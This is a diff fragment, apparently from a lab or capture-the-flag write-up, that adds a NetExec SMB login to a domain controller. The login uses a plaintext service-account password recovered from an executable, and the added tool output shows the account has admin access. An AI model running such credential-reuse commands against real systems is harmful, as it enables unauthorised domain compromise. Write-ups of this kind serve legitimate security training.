@@ -628,5 +628,9 @@ ldap_svc:D@rkhav3nLDAP2024!
 Hardcoded credentials in the .exe file
 
 ```python
-
+nxc smb dc02.corp.darkhaven.tech -d corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!'
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-KK0CT8N) (domain:corp.darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.10.10.5      445    EC2AMAZ-KK0CT8N  [+] corp.darkhaven.tech\ldap_svc:D@rkhav3nLDAP2024! (Pwn3d!)
 ```
+This user is an admin on `dc02`
+
